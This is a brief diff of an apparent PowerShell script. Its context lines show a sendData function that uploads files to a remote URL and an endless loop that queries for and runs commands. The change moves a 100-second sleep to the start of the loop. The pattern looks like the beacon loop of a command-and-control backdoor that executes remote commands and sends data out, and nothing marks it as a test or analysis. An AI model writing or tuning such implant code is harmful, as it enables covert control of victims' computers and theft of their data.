@@ -35,7 +35,8 @@ function sendData($datatosend) {
         $wc.UploadFile($url,$datatosend)
 }
 While ($True){
+    Start-Sleep -s 100
     query
     runcommand
-    Start-Sleep -s 100
 }
+
